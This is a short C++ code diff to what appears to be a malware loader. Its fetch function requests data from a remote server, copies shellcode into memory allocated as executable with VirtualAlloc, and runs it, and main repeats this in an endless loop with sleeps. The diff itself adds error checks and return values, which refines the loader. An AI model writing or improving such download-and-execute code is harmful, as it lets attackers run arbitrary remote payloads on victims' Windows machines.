@@ -40,7 +40,9 @@ int fetch(string server, string path) {
 
 	// send HTTP GET request to server
 	string get_http = "GET " + path + " HTTP/1.1\r\nHost: " + server + "\r\nConnection: close\r\n\r\n";
-	send(sock, get_http.c_str(), strlen(get_http.c_str()), 0);
+	
+	if (send(sock, get_http.c_str(), strlen(get_http.c_str()), 0) < 1)
+		return -1;
 
 	// receive and store http response
 	if (recv(sock, buf, 8192, 0) < 1)
@@ -57,6 +59,8 @@ int fetch(string server, string path) {
 	void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(exec, shellcode, sizeof(shellcode));
 	((void(*)())exec)();
+	
+	return 1;
 }
 
 int main() {
@@ -68,7 +72,7 @@ int main() {
 
 	messagebox();
 	while (true) {
-		if (fetch(server, path) < 1)
+		if (fetch(server, path) == -1)
 		    continue;
 		Sleep(100000);
 	}
